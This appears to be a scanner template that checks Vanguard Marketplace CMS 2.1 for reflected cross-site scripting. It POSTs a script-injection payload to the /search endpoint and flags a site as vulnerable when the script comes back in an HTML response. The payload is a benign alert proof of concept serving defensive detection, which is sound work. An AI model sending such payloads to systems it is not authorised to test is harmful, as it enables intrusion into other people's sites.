id: vanguard-post-xss
brief:
    title: Vanguard Marketplace CMS 2.1 - Cross-Site Scripting
    by: ImNightmaree
    level: high
    about: Vanguard Marketplace CMS 2.1 contains a cross-site scripting vulnerability in the message and product title tags and in the product search box.
    label:
        - vanguard
        - xss
        - packetstorm
        - vuln
    score: CVSS:7.2
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/search'
      head:
        Content-Type: application/x-www-form-urlencoded
      body: phps_query=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
      signs:
        - "on": word
          has:
            - </script><script>alert(document.domain)</script>
          in: body
          need: all
        - "on": word
          has:
            - text/html
          in: header
          need: all
        - "on": status
          status:
            - 200
